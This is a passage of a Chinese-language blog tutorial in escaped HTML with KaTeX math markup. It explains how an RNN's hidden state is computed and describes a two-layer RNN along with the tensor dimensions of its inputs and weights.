&lt;p&gt;将两个结果进行相加得到要输入到下一时刻的隐层状态&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_t&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;多层RNN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;对于多层的RNN，包含了多个线性层，如下图所示是一个二层的RNN：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;9&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554602087.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;每一层线性层将上一层的输出和上一时刻的隐层状态作为输入，以二层为例，第一层以嵌入向量和上一时刻隐层状态作为输入，第二层以第一层的输出和上一时刻的隐层状态作为输入。其维度为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x_t/feature\space [batch, feature\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{xh}^1\space [hidden\space len, feature \space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.097216em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h_t^1\space [batch, hidden \space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.247em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{hh}^1\space[hidden\space len ,hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.097216em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;/mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt; &lt;/mtext&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;w_{xh}^2\space [batch, hidden\space len]&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.097216em;vertical-align:-0.2831079999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-2.4168920000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;h&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2831079999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
